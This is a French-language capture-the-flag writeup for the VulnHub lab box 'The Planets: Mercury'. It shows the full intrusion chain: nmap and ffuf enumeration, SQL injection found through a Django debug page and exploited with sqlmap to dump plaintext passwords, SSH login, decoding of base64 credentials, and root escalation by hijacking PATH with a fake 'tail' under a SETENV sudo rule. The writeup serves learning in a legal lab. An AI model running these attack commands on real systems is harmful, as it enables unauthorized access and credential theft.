---
layout: default
title: "Writeup The Planets: Mercury - Vulnhub"
date:   2020-09-05 03:00:00 +0200
published: true
---

# Informations sur la box :

* **Difficulté** : Facile
* **Description** : *BMercury is an easier box, with no bruteforcing required. There are two flags on the box: a user and root flag which include an md5 hash. This has been tested on VirtualBox so may not work correctly on VMware. Any questions/issues or feedback please email me at: SirFlash at protonmail.com*
* **Type de fichier** : .ova (VirtualBox)
* **DHCP** : Activé
* **Lien** : [https://www.vulnhub.com/entry/the-planets-mercury,544/](https://www.vulnhub.com/entry/the-planets-mercury,544/)


### Ce que nous allons aborder dans ce writeup :

*	[Énumération](#énumération)
* 	[Shell basique](#shell-basique)
*	[Privilege escalation linuxmaster](#privilege-escalation-linuxmaster)
*	[Privilege escalation root](#privilege-escalation-root)

* * *

## Énumération
* * *

On trouve l'adresse IP de la box à attaquer à l'aide de ``nmap`` :

```bash
nmap -sP 192.168.1.0/24
```

On obtient son adresse IP qui est la suivante : **192.168.1.29**

On scanne ensuite les ports pour trouver ceux qui sont ouverts avec les services qui tournent dessus :

```bash
nmap -sV -p- 192.168.1.29 -O -A --min-rate 5000 -T5
```

* **-sV** : Permet de scanner les services et d'indiquer les versions et les informations correspondantes
* **-p-** : On scan TOUS les ports
* **-O** : Détection de l'OS
* **-A** : Mode aggressif
* **--min-rate 5000** : Définit le nombre d'envoi de paquets par secondes
* **-T5** : Définit le template comme "rapide"

Pour plus d'informations vous pouvez consulter le ``man`` de nmap.

Voici ce qu'on obtient :

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: WSGIServer/0.2 CPython/3.8.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

Normalement ``nmap`` nous sort beaucoup plus d'informations concernant le service web qui tourne sur le **port 8080** mais ces informations nous sont inutiles.

Comme à mon habitude je commence par essayer de me connecter au **SSH** pour voir si jamais une **bannière** est présente :

```bash
ssh root@192.168.1.29
```

Aucune bannière n'est présente.

Grâce au scan ``nmap`` on a l'information qu'il y a un fichier **robots.txt** avec le répertoire racine (``/``) "disallowed".

On peut quand même lancer **ffuf** pour faire du fuzzing web et trouver de potentiels nouveaux éléments :

```bash
ffuf -u http://192.168.1.29/FUZZ -w /usr/share/dirb/wordlists/directory-list-2.3-big.txt -e .html,.php,.txt
```

Malheureusement nous n'avons pas plus de résultat qu'avec le scan ``nmap`` :

```bash
robots.txt              [Status: 200, Size: 26, Words: 4, Lines: 2]
```

J'ai tenté de regarder si des exploits étaient disponibles pour cette version de serveur -> **WSGIServer/0.2** et **CPython/3.8.2** mais rien de bien concluant.

Pendant mes tests j'ai remarqué que le fait de vouloir accéder à un répertoire ou fichier qui n'existe pas sur le serveur web nous renvoie cette erreur :

```
Page not found (404)
Request Method: 	GET
Request URL: 	http://192.168.1.29:8080/test

Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:

    1. [name='index']
    2. robots.txt [name='robots']
    3. mercuryfacts/

The current path, test, didn't match any of these.

You're seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.

```

Ceci nous donne pas mal d'**informations**.                                                                                                                                                       
Tout d'abord le fait que le mode **DEBUG** soit activé et donc qu'on nous montre beaucoup plus d'informations que s'il était désactivé.        

On nous propose aussi d'utiliser des **patterns** d'URL. Et là on voit qu'on a quelque chose qui semble ressembler à un répertoire du nom de **mercuryfacts**.

Allons y faire un tour !

On se retrouve bien sur une nouvelle page avec **deux liens** à l'intérieur.                                                                                                                   
On va commencer par celui qui nous redirige vers [http://192.168.1.29:8080/mercuryfacts/todo](http://192.168.1.29:8080/mercuryfacts/todo). Il s'agit d'une todo liste qui est la suivante :

```
Still todo:

    Add CSS.
    Implement authentication (using users table)
    Use models in django instead of direct mysql call
    All the other stuff, so much!!!
```

On y apprend que la base de données qui tourne derrière est une **MySQL** ainsi qu'il existe une table nommée **users**.

L'autre lien redirige vers [http://192.168.1.29:8080/mercuryfacts/1/](http://192.168.1.29:8080/mercuryfacts/1/) et semble être des faits relatifs à la planète Mercure (d'où le nom de la box si vous n'aviez pas encore compris :p).

Le contenu de la page est le suivant :

```
Fact id: 1. (('Mercury does not have any moons or rings.',),)
```

On peut voir qu'un **ID** est utilisé. On peut s'amuser à changer celui-ci pour voir s'il y a des changements : [http://192.168.1.29:8080/mercuryfacts/2/](http://192.168.1.29:8080/mercuryfacts/2/)

On se retrouve avec le contenu de la page qui a changé :

```
Fact id: 2. (('Mercury is the smallest planet.',),)
```
 
A cet instant on est presque sûr qu'il y a un **paramètre** caché dans l'URL qui correspond à l'ID du "fact" à afficher et qui permet de faire l'appel nécessaire à la base de données pour afficher l'information demandée.

Pour en être sûr il suffit de tester si effectivement le paramètre "caché" est **vulnérable** à une **injection SQL**. Pour ce faire il suffit de mettre une **apostrophe** à l'endroit où on doit mettre l'identifiant. Par exemple [http://192.168.1.29:8080/mercuryfacts/'/](http://192.168.1.29:8080/mercuryfacts/'/) :

```
ProgrammingError at /mercuryfacts/'/

(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1")
```

Ce n'est qu'une petite partie de l'erreur qui est affichée mais celà nous suffit pour confirmer l'existence d'une **faille SQL**.

Sachant ça on peut s'amuser avec ``sqlmap`` pour récupérer les informations qui nous intéressent.

* * *

## Shell basique

```bash
sqlmap -u http://192.168.1.29:8080/mercuryfacts/1 --dbs
```

On spécifie l'URL vulnérable avec l'option **-u**.                                                                                                                                                
**\-\-dbs** permet de lister les bases de données présentes, ce qui donne :

```bash
[*] information_schema
[*] mercury
```

Ici c'est **mercury** que l'on souhaite utiliser. Pour spécifier la base ce sera avec l'option **-D** puis le nom de la base.

On va refaire l'opération successivement avec les options **\-\-tables** puis **\-\-columns** pour lister les tables et colonnes disponibles.

La sélection de la table se fait en rajoutant l'option **-T** à la suite de la commande suivie du nom de la table :

```bash
sqlmap -u http://192.168.1.29:8080/mercuryfacts/1 -D mercury --tables

+-------+
| facts |
| users |
+-------+


sqlmap -u http://192.168.1.29:8080/mercuryfacts/1 -D mercury -T users --columns

+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int         |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+
```

On ne pourrait **dump** qu'une certaine colonne mais dans notre cas on désire obtenir les **noms d'utilisateurs** et les **mots de passe** donc on va directement tout récupérer :

```bash
sqlmap -u http://192.168.1.29:8080/mercuryfacts/1 -D mercury -T users --dump

+----+-----------+-------------------------------+
| id | username  | password                      |
+----+-----------+-------------------------------+
| 1  | john      | johnny1987                    |
| 2  | laura     | lovemykids111                 |
| 3  | sam       | lovemybeer111                 |
| 4  | webmaster | mercuryisthesizeof0.056Earths |
+----+-----------+-------------------------------+
```

On se retrouve avec une liste d'utilisateurs et de mot de passe. Il ne nous reste plus qu'à les essayer sur le **SSH**.

Et le vainqueur est **webmaster** avec le mot de passe **mercuryisthesizeof0.056Earths** qui arrive à se connecter.

On peut récupérer le premier **flag** dans le répertoire de l'utilisateur :

```bash
cat /home/webmaster/user_flag.txt 

[user_flag_8339915c9a454657bd60ee58776f4ccd]
```

On fait un tour dans le fichier ``/etc/passwd`` pour voir quels utilisateurs sont présents sur la machine :

```
mercury:x:1000:1000:mercury:/home/mercury:/bin/bash
webmaster:x:1001:1001:,,,:/home/webmaster:/bin/bash
linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash
```

* * *

## Privilege escalation linuxmaster

On se promène un peu dans le répertoire de l'utilisateur actuel (``webmaster``) et on tombe sur quelque chose d'intéressant :

```bash
cat /home/webmaster/mercury_proj/notes.txt
```

```
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

On voit déjà à première vue qu'il s'agit de **base64**. On peut donc le décoder directement avec cette commande :

```bash
echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
```

Et on récupère ce mot de passe : **mercurymeandiameteris4880km**

On peut en faire de même pour l'autre mot de passe mais on retombe sur celui que l'on connait déjà (``mercuryisthesizeof0.056Earths``).


On se connecte à l'utilisateur **linuxmaster** avec notre nouveau mot de passe :

```bash
su linuxmaster
```

* * *

## Privilege escalation root

Un ``sudo -l`` nous donne des indications sur ce qu'il faut faire ensuite :

```bash
(root : root) SETENV: /usr/bin/check_syslog.sh
```

On voit qu'on peut exécuter le script ``/usr/bin/check_syslog.sh`` en tant que **root**.                                                                                                        

On affiche le contenu du script :

```bash
#!/bin/bash
tail -n 10 /var/log/syslog
```

La première chose qui nous saute aux yeux est l'utilisation de la commande **tail** sans spécifier son *chemin absolu* ! Grave faille de sécurité puisqu'on peut faire exécuter un autre fichier qui porte le même nom à la place de celui qui doit être appelé initialement.

On tente alors de se rendre dans le répertoire ``/tmp``, on crée un fichier que l'on nomme **tail** et on y insère du code bash pour exécuter ``/bin/bash`` en tant que root. On change alors notre variable PATH pou que ce soit notre fichier **tail** qui se situe dans ``/tmp`` qui soit appelé à la place de celui dans ``/usr/bin/`` :

```bash
cd /tmp && echo -e "#!/bin/bash\n/bin/bash" > tail && chmod +x tail
PATH=/tmp:$PATH
```

Si maintenant on lance la commande en tant que root :

```bash
sudo /usr/bin/check_syslog.sh
```

Rien ne se passe ...

Pourquoi ? Eh bien parce que l'utilisateur root possède ses propres variables d'environnement. Et donc notre **PATH** que nous venons de modifier n'est pas le même que celui de root.

Revenons au contenu du fichier ``sudoers``.

Pour ma part je n'étais encore jamais tombé sur le mot clé **SETENV** dans ce fichier. J'ai donc fait quelques recherches et grâce à ces deux sites j'ai pu comprendre son utilité :

- [https://toroid.org/sudoers-syntax](https://toroid.org/sudoers-syntax)
- [https://www.petefreitag.com/item/877.cfm](https://www.petefreitag.com/item/877.cfm)

Pour vous résumer :

L'utilisateur qui possède l'option **SETENV** peut préserver ses variables d'environnement lorsqu'il exécute la commande spécifiée en tant qu'un autre utilisateur.

C'est exactement ce qu'il nous faut ! Si on réussi à garder notre variable **PATH** et que l'utilisateur root l'utilise alors il exécutera notre script !

Il suffit d'utiliser l'option **\-\-preserve-env** ainsi que la variable à préserver et le tour est joué :

```bash
sudo --preserve-env=PATH /usr/bin/check_syslog.sh
```

Et on devient root !

On aurait pu également directement affecter la nouvelle valeur à notre variable d'environnement directement depuis la commande :

```bash
sudo PATH=/tmp:$PATH /usr/bin/check_syslog.sh
```

Il ne nous reste plus qu'à récupérer le flag root :

```bash
cat /root/root_flag.txt
```

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Congratulations on completing Mercury!!!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_69426d9fda579afbffd9c2d47ca31d90]
```

Dans cette box j'ai appris l'existence de l'option **SETENV** dans le fichier ``sudoers`` ainsi que comment l'exploiter.

Un grand merci à son créateur !